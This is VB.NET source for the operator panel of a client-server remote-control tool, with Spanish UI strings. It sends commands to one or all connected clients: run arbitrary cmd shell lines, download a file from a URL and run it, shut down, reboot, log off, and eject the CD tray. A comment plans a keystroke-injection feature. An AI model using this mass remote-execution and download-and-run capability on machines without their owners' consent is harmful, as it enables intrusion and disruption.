Public Class CMD

    Private Sub CMD_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        IndexList()
    End Sub

    Sub IndexList()
        ListBox1.Items.Clear()
        For Each Item As String In MainSV.ListBox1.Items
            ListBox1.Items.Add(Item)
        Next
    End Sub

    Private Sub RadioButton2_CheckedChanged(sender As Object, e As EventArgs) Handles RadioButton2.CheckedChanged
        If RadioButton2.Checked = True Then
            ListBox1.Enabled = True
            IndexList()
        Else
            ListBox1.Enabled = False
        End If
    End Sub

    Private Sub OpenCD_Click(sender As Object, e As EventArgs) Handles Button1.Click
        If RadioButton1.Checked = True Then
            For Each User As String In ListBox1.Items
                MainSV.ENVIARTODOS("@CMD|CDrive|" & User & "|Open")
            Next
        Else
            MainSV.ENVIARTODOS("@CMD|CDrive|" & ListBox1.SelectedItem & "|Open")
        End If
        MainSV.TextBoxCHAT.AppendText(vbCrLf & "Abrir DVD Driver")
    End Sub

    Private Sub CloseCD_Click(sender As Object, e As EventArgs) Handles Button2.Click
        If RadioButton1.Checked = True Then
            For Each User As String In ListBox1.Items
                MainSV.ENVIARTODOS("@CMD|CDrive|" & User & "|Close")
            Next
        Else
            MainSV.ENVIARTODOS("@CMD|CDrive|" & ListBox1.SelectedItem & "|Close")
        End If
        MainSV.TextBoxCHAT.AppendText(vbCrLf & "Cerrar DVD Driver")
    End Sub

    Private Sub RunCMD_Click(sender As Object, e As EventArgs) Handles Button3.Click
        If RadioButton1.Checked = True Then
            For Each User As String In ListBox1.Items
                MainSV.ENVIARTODOS("@CMD|cmdEjecute|" & User & "|" & InputBox("Ingrese la linea a ejecutar", "Run CMD Shell Command", "/c ipconfig"))
            Next
        Else
            MainSV.ENVIARTODOS("@CMD|cmdEjecute|" & ListBox1.SelectedItem & "|" & InputBox("Ingrese la linea a ejecutar", "Run CMD Shell Command", "/c ipconfig"))
        End If
        MainSV.TextBoxCHAT.AppendText(vbCrLf & "Iniciar comando remoto")
    End Sub

    Private Sub Shutdown_Click(sender As Object, e As EventArgs) Handles Button4.Click
        If RadioButton1.Checked = True Then
            For Each User As String In ListBox1.Items
                MainSV.ENVIARTODOS("@CMD|System|" & User & "|Shutdown")
            Next
        Else
            MainSV.ENVIARTODOS("@CMD|System|" & ListBox1.SelectedItem & "|Shutdown")
        End If
        MainSV.TextBoxCHAT.AppendText(vbCrLf & "Apagar computador remoto")
    End Sub

    Private Sub Reboot_Click(sender As Object, e As EventArgs) Handles Button5.Click
        If RadioButton1.Checked = True Then
            For Each User As String In ListBox1.Items
                MainSV.ENVIARTODOS("@CMD|System|" & User & "|Reboot")
            Next
        Else
            MainSV.ENVIARTODOS("@CMD|System|" & ListBox1.SelectedItem & "|Reboot")
        End If
        MainSV.TextBoxCHAT.AppendText(vbCrLf & "Reiniciar computador remoto")
    End Sub

    Private Sub Logoff_Click(sender As Object, e As EventArgs) Handles Button6.Click
        If RadioButton1.Checked = True Then
            For Each User As String In ListBox1.Items
                MainSV.ENVIARTODOS("@CMD|System|" & User & "|Logoff")
            Next
        Else
            MainSV.ENVIARTODOS("@CMD|System|" & ListBox1.SelectedItem & "|Logoff")
        End If
        MainSV.TextBoxCHAT.AppendText(vbCrLf & "Terminar sesión remota")
    End Sub

    Private Sub DownloadRun_Click(sender As Object, e As EventArgs) Handles Button7.Click
        MsgBox("Right click in the button to config", MsgBoxStyle.Information, "Download/Run")
    End Sub

    Private Sub STARTToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles STARTToolStripMenuItem.Click
        If RadioButton1.Checked = True Then
            For Each User As String In ListBox1.Items
                MainSV.ENVIARTODOS("@CMD|Download|" & User & "|" & ToolStripTextBox1.Text & "|" & ToolStripTextBox2.Text)
            Next
        Else
            MainSV.ENVIARTODOS("@CMD|Download|" & ListBox1.SelectedItem & "|" & ToolStripTextBox1.Text & "|" & ToolStripTextBox2.Text)
        End If
        MainSV.TextBoxCHAT.AppendText(vbCrLf & "Iniciar Fichero Remoto")
    End Sub

    Private Sub RUNToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles RUNToolStripMenuItem1.Click
        If RadioButton1.Checked = True Then
            For Each User As String In ListBox1.Items
                MainSV.ENVIARTODOS("@CMD|Run|" & User & "|" & ToolStripTextBox3.Text)
            Next
        Else
            MainSV.ENVIARTODOS("@CMD|Run|" & ListBox1.SelectedItem & "|" & ToolStripTextBox3.Text)
        End If
        MainSV.TextBoxCHAT.AppendText(vbCrLf & "Iniciar Fichero Remoto")
    End Sub

    Private Sub RunDownloadedFileToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RunDownloadedFileToolStripMenuItem.Click
        If RadioButton1.Checked = True Then
            For Each User As String In ListBox1.Items
                MainSV.ENVIARTODOS("@CMD|Run|" & User & "|DownloadedFile|" & ToolStripTextBox1.Text)
            Next
        Else
            MainSV.ENVIARTODOS("@CMD|Run|" & ListBox1.SelectedItem & "|DownloadedFile|" & ToolStripTextBox1.Text)
        End If
        MainSV.TextBoxCHAT.AppendText(vbCrLf & "Descargar Fichero Remoto")
    End Sub

    Private Sub btnSayAsCMD_Click(sender As Object, e As EventArgs) Handles Button8.Click
        Dim TXVR = InputBox("Ingrese un mensaje", "Decir como Comando")
        If TXVR = Nothing Then
        Else
            MainSV.ENVIARTODOS(TXVR)
            MainSV.TextBoxCHAT.AppendText(vbCrLf & "Dijiste: " & TXVR)
        End If
    End Sub

    Private Sub btnConfigFile_Click(sender As Object, e As EventArgs) Handles Button9.Click
        MsgBox("Esta caracteristica sigue en desarrollo", MsgBoxStyle.Information, "Cambiar configuracion inicial")
    End Sub
End Class
'IDEA SEND KEYS
'Al escribir un texto, al ser enviado este texo a un proximo modulo SendKeys, este modulo tomara cada caracter y lo agregara como un item a un ArrayList
'Al leer los caracteres, pasara por un modulo For Each char as string in ArrayList
'Asi se enviara una tecla por cada item que haya en un arraylist (no se entendio pero es para no perder la idea, esta idea es fragil)